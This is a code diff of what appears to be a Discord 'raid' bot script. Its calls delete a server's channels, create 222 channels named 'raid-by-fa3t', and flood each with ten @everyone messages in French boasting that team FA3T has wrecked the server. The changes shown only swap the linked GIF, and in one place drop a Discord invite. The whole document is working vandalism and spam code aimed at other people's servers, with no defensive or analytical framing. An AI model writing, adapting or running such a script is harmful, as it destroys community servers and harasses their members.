@@ -19,7 +19,7 @@ raid.deleteChannels("raid", {
 });
 raid.createChannels("raid", {
     createChannelName: "raid-by-fa3t",
-    sendMessageContent: ":biohazard: :biohazard: **@everyone LA TEAM FA3T VOUS BZ VOTRE SERVEUR @everyone** :biohazard: :biohazard:\n\n**https://discord.gg/a5rJk2D**\n\nhttps://cdn.discordapp.com/attachments/517494453095890964/521841805642170369/PatateQuiFaitMalOYeux.gif",
+    sendMessageContent: ":biohazard: :biohazard: **@everyone LA TEAM FA3T VOUS BZ VOTRE SERVEUR @everyone** :biohazard: :biohazard:\n\n**https://giffiles.alphacoders.com/310/3105.gif",
     sendMessageCount: 10,
     createChannelCount: 222
 });
@@ -35,11 +35,11 @@ raid.deleteChannel("del");
 raid.deleteChannels("delAll", {
     createChannel: true,
     createdChannelName: "vous-etes-bz",
-    createChannelMessage: ":biohazard: :biohazard: **@everyone LA TEAM FA3T VOUS BZ VOTRE SERVEUR @everyone** :biohazard: :biohazard:\n\n**https://discord.gg/a5rJk2D**\n\nhttps://cdn.discordapp.com/attachments/517494453095890964/521841805642170369/PatateQuiFaitMalOYeux.gif"
+    createChannelMessage: ":biohazard: :biohazard: **@everyone LA TEAM FA3T VOUS BZ VOTRE SERVEUR @everyone** :biohazard: :biohazard:\n\n**https://discord.gg/a5rJk2D**\n\nhttps://giffiles.alphacoders.com/310/3105.gif"
 });
 raid.createChannels("chnls", {
     createChannelName: "raid-by-fa3t",
-    sendMessageContent: ":biohazard: :biohazard: **@everyone LA TEAM FA3T VOUS BZ VOTRE SERVEUR @everyone** :biohazard: :biohazard:\n\n**https://discord.gg/a5rJk2D**\n\nhttps://cdn.discordapp.com/attachments/517494453095890964/521841805642170369/PatateQuiFaitMalOYeux.gif",
+    sendMessageContent: ":biohazard: :biohazard: **@everyone LA TEAM FA3T VOUS BZ VOTRE SERVEUR @everyone** :biohazard: :biohazard:\n\n**https://discord.gg/a5rJk2D**\n\nhttps://giffiles.alphacoders.com/310/3105.gif",
     sendMessageCount: 10,
     createChannelCount: 222
 });
